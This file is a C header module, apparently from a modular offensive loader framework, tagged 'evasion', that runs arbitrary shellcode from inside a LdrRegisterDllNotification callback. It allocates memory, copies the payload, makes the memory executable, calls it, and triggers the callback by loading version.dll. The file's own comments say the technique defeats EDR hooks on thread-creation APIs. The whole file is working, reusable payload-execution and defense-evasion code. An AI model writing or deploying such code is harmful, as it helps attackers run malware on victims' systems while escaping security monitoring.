// chunk: evasion/dll_notif_callback
// depends: (none)
// provides: dll_notif_init
// headers: windows.h
// risk: low
// note: LdrRegisterDllNotification callback — registers a notification that fires
//       whenever a DLL is loaded/unloaded. The callback executes from a legitimate
//       system context (ntdll loader) making it appear benign. Stores payload pointer
//       and executes it on first DLL load event. One-shot: unregisters after firing.
//       Defeats EDR hooks on CreateThread/QueueUserAPC since execution originates
//       from the loader itself. Trigger by calling LoadLibraryA on a benign DLL.

#ifndef CHUNK_DLL_NOTIF_CALLBACK
#define CHUNK_DLL_NOTIF_CALLBACK

#include <windows.h>

/* LDR_DLL_NOTIFICATION_DATA structures (not in mingw headers) */
typedef struct _MY_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG              Flags;
    MY_UNICODE_STRING  *FullDllName;
    MY_UNICODE_STRING  *BaseDllName;
    PVOID              DllBase;
    ULONG              SizeOfImage;
} LDR_DLL_LOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA {
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
    LDR_DLL_LOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA;

typedef VOID (CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG NotificationReason,
    LDR_DLL_NOTIFICATION_DATA *NotificationData,
    PVOID Context);

typedef NTSTATUS (NTAPI *pfnLdrRegisterDllNotification)(
    ULONG Flags,
    PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    PVOID Context,
    PVOID *Cookie);

typedef NTSTATUS (NTAPI *pfnLdrUnregisterDllNotification)(PVOID Cookie);

#define LDR_DLL_NOTIFICATION_REASON_LOADED   1

/* State passed through the Context pointer */
typedef struct _DLL_NOTIF_CTX {
    BYTE  *payload;
    DWORD  payload_size;
    PVOID  cookie;
    volatile LONG fired;
} DLL_NOTIF_CTX;

static DLL_NOTIF_CTX _dn_ctx = {0};

static pfnLdrUnregisterDllNotification _pLdrUnregister = NULL;

/*
 * Callback invoked by ntdll loader on DLL load/unload.
 * Runs payload on first DLL_LOADED event, then unregisters itself.
 */
static VOID CALLBACK _dll_notif_handler(
    ULONG NotificationReason,
    LDR_DLL_NOTIFICATION_DATA *NotificationData,
    PVOID Context)
{
    (void)NotificationData;
    DLL_NOTIF_CTX *ctx = (DLL_NOTIF_CTX *)Context;

    if (NotificationReason != LDR_DLL_NOTIFICATION_REASON_LOADED)
        return;

    /* One-shot: only fire once */
    if (InterlockedCompareExchange(&ctx->fired, 1, 0) != 0)
        return;

    if (ctx->payload && ctx->payload_size > 0) {
        /* Copy payload to executable memory and call it */
        PVOID exec_mem = VirtualAlloc(NULL, ctx->payload_size,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_READWRITE);
        if (exec_mem) {
            memcpy(exec_mem, ctx->payload, ctx->payload_size);

            DWORD old_prot;
            VirtualProtect(exec_mem, ctx->payload_size, PAGE_EXECUTE_READ, &old_prot);

            /* Execute as function pointer */
            ((void (*)(void))exec_mem)();

            VirtualFree(exec_mem, 0, MEM_RELEASE);
        }
    }

    /* Unregister so we don't fire again */
    if (_pLdrUnregister && ctx->cookie) {
        _pLdrUnregister(ctx->cookie);
        ctx->cookie = NULL;
    }
}

/*
 * dll_notif_init: Register a DLL load notification that executes payload.
 *
 * payload:      shellcode / position-independent code
 * payload_size: size in bytes
 *
 * After calling this, trigger execution by loading any DLL:
 *   LoadLibraryA("version.dll");
 *
 * Returns 1 on success, 0 on failure.
 */
static int dll_notif_init(BYTE *payload, DWORD payload_size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnLdrRegisterDllNotification pLdrRegister =
        (pfnLdrRegisterDllNotification)GetProcAddress(ntdll, "LdrRegisterDllNotification");
    _pLdrUnregister =
        (pfnLdrUnregisterDllNotification)GetProcAddress(ntdll, "LdrUnregisterDllNotification");

    if (!pLdrRegister || !_pLdrUnregister) return 0;

    _dn_ctx.payload = payload;
    _dn_ctx.payload_size = payload_size;
    _dn_ctx.cookie = NULL;
    _dn_ctx.fired = 0;

    NTSTATUS status = pLdrRegister(0, _dll_notif_handler, &_dn_ctx, &_dn_ctx.cookie);
    if (status != 0) return 0;

    /* Trigger the callback by loading a benign system DLL */
    HMODULE hTrigger = LoadLibraryA("version.dll");
    if (hTrigger) FreeLibrary(hTrigger);

    return (_dn_ctx.fired == 1) ? 1 : 0;
}

#endif
